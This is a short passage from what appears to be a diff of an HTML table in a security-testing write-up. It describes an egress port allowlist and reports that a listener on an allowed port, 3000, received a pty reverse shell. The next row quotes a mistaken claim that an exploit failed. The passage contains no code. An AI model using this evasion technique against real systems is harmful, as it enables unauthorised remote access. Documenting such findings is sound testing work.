+<td>Egress is a <strong>destination-port allowlist</strong>: <code>4444</code>, <code>8080</code>, <code>8834</code> are dropped; <code>22</code>, <code>53</code>, <code>80</code>, <code>443</code>, <code>3000</code> are permitted. A listener on <code>3000</code> received a <code>pty</code> shell.</td>
 </tr>
 <tr>
 <td>"The preload file is gone — the exploit failed"</td>
